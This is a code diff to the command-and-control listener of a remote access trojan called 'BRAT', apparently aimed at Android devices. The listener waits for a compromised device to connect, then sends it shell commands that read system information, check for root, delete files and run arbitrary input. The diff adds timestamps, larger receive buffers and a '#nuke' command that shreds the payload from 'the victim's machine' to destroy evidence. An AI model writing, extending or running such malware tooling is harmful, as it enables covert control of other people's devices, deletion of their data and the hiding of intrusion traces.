@@ -4,20 +4,22 @@ from time import sleep
 
 host = sys.argv[1]
 port = int(sys.argv[2])
+output = sys.argv[3]
 
 import socket
 import sys
+from time import asctime
 from time import sleep
 
-print(("[+] Listening on port " + str(port)))
+print(("[" + asctime() + "] Listening on port " + str(port)))
 sleep(1)
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((host, port))
     s.listen(5)
-    print("[+] Waiting Connection From Client...")
+    print("[" + asctime() + "] Waiting Connection From Client...")
     c, _ = s.accept()
-    print(('[*] Session Opened | ' + 'IP : ' + _[0] + ' | Port : ' + str(_[1])+'\n'))
+    print(('[' + asctime() + '] Session Opened | ' + 'IP : ' + _[0] + ' | Port : ' + str(_[1])+'\n'))
     sleep(2)
 
 except OSError as error:
@@ -37,9 +39,10 @@ def raw_converter(string):
     result = result.replace(t, '\t')
     return result
 
-def main():
+def main(prog_name):
     and_pwd = ' && pwd\n'
     meminfo = 'cat /proc/meminfo'
+    nuke_it = 'shred --force -n 35 -u -v -z ' + prog_name
     cpuinfo = 'cat /proc/cpuinfo'
     crypto = 'cat /proc/crypto'
     check_root = 'which su'
@@ -48,6 +51,7 @@ def main():
 
     and_pwd = and_pwd.encode()
     meminfo = meminfo.encode()
+    nuke_it = nuke_it.encode()
     cpuinfo = cpuinfo.encode()
     crypto = crypto.encode()
     check_root = check_root.encode()
@@ -57,24 +61,24 @@ def main():
     print("[i] Type '#help' for information.")
     while True:
         hosttt = _[0]
-        cmd = input('[BRAT@' + hosttt + ']: ')
+        cmd = input('[' + asctime() + ' | BRAT@' + hosttt + ']: ')
         
         if cmd[0:5] == 'mkdir':
             cmd = cmd.encode()
             c.send(cmd+and_pwd)
-            output = c.recv(1024)
+            output = c.recv(10000)
             output = raw_converter(output)
             print(output)
         
         elif cmd == 'meminfo':
             c.send(meminfo)
-            output = c.recv(1024)
+            output = c.recv(10000)
             output = raw_converter(output)
             print(output)
         
         elif cmd == 'cpuinfo':
             c.send(cpuinfo)
-            output = c.recv(1024)
+            output = c.recv(10000)
             output = raw_converter(output)
             print(output)
         
@@ -87,13 +91,13 @@ def main():
         elif cmd == 'kernel_info':
             cmd = cmd.encode()
             c.send(cmd)
-            ab = c.recv(1024)
+            ab = c.recv(10000)
             ab = raw_converter(ab)
             print(("\n[+] \033[37;1mKernel Version : "+str(ab)))
         
         elif cmd == 'check_root':
             c.send(check_root)
-            a = c.recv(1024)
+            a = c.recv(10000)
             if a == r'\n/system/bin/su\n':
                 print("\n[*] This Device Is Rooted...\n")
             
@@ -123,31 +127,38 @@ rmdir            : Remove Folder On Target
 whoami           : Check Name User Target
 crypto           : Check Encoding On Target
 check_partitions : Check Info Partisi On Target
+#nuke            : Delete the payload from the victim's machine
 #logout          : Close the connection; You need to restart the payload to reconnect!
 """)
 
         elif cmd[0:2] == 'rm':
             cmd = cmd.encode()
             c.send(cmd+and_pwd)
-            output = c.recv(1024)
+            output = c.recv(10000)
             output = raw_converter(output)
         
         elif cmd[0:5] == 'rmdir':
             cmd = cmd.encode()
             c.send(cmd+and_pwd)
-            output = c.recv(1024)
+            output = c.recv(10000)
             output = raw_converter(output)
             print(output)
         
         elif cmd[0:6] == 'whoami':
             c.send(whoami)
-            output = c.recv(1024)
+            output = c.recv(10000)
+            output = raw_converter(output)
+            print(output)
+
+        elif cmd == '#nuke':
+            c.send(nuke_it)
+            output = c.recv(10000)
             output = raw_converter(output)
             print(output)
 
         elif cmd == '#logout':
             #c.close()
-            print("[i] Connection closed by local host...")
+            print("[" + asctime() + "] Connection closed by local host...")
             break
         
         elif cmd == '':
@@ -156,7 +167,7 @@ check_partitions : Check Info Partisi On Target
         else:
             cmd = cmd.encode()
             c.send(cmd)
-            results = c.recv(4096)
+            results = c.recv(10000)
             results = raw_converter(results)
             if results == 'bacod':
                 continue
@@ -164,7 +175,7 @@ check_partitions : Check Info Partisi On Target
             print(results)
 
 try:
-    main()
+    main(output)
 except KeyboardInterrupt:
     print("[!] CTRL+C Detected. Shutdown Server...")
     sleep(2)
